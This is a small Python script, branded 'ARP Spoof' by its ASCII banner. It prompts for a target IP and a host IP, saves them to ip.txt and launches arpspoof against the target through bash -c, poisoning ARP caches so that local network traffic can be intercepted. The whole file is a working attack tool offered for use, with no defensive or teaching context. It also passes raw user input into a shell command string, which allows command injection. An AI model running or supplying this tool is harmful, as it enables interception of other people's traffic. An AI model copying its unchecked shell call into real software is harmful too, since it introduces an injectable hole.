import subprocess
import os

command = None
ipAddress = None
ipAddressTwo = None
ipAdressConfirmed = False
ipAdressTwoConfirmed = False
wrongParameterVar = False



def banner():
    print("    ___  ____________    _____                    __ ")
    print("   / _ \ | ___ \ ___ \  /  ___|                  / _|")
    print("  / /_\ \| |_/ / |_/ /  \ `--. _ __   ___   ___ | |_ ")
    print("  |  _  ||    /|  __/    `--. \ '_ \ / _ \ / _ \|  _|")
    print("  | | | || |\ \| |      /\__/ / |_) | (_) | (_) | |  ")
    print("  \_| |_/\_| \_\_|      \____/| .__/ \___/ \___/|_|  ")
    print("                              | |                    ")
    print("                              |_|                    ")

def wrongParameter():
    if wrongParameterVar==True:
        print("Wrong Parameter")

def writeFile():
    target = open("ip.txt", "w")
    target.write("%s\n%s\n" % (ipAddress, ipAddressTwo))



while ipAdressConfirmed == False:
    os.system("clear")
    banner()
    print("Enter IP-Address to be forwarded")
    wrongParameter()
    ipAddress = input()
    print("The IP-Adress to be forwarded ist", ipAddress)
    print("1) Approve   2)Re-enter")

    option = str(input())
    if option == '1':
        ipAdressConfirmed = True
        wrongParameterVar = False
    elif option == '2':
        pass
    else:
        wrongParameterVar = True

while ipAdressTwoConfirmed==False:
    os.system("clear")
    banner()
    print("Enter Host's IP-Address")
    wrongParameter()
    ipAddressTwo = input()
    print("The Host's IP-Adress is: ", ipAddressTwo)
    print("1) Approve   2)Re-enter")

    option = str(input())
    if option == '1':
        ipAdressTwoConfirmed = True
        writeFile()
        wrongParameterVar = False
        command = ("arpspoof -t %s %s") % (ipAddress,ipAddressTwo)
        os.system("clear")
        subprocess.check_output(['bash', '-c', command])
    elif option == '2':
        pass
    else:
        wrongParameterVar = True